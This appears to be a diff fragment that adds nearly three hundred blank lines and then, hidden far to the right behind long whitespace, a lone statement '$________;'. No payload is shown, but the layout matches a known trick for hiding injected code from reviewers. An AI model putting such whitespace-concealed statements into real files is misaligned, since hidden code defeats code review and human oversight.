+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
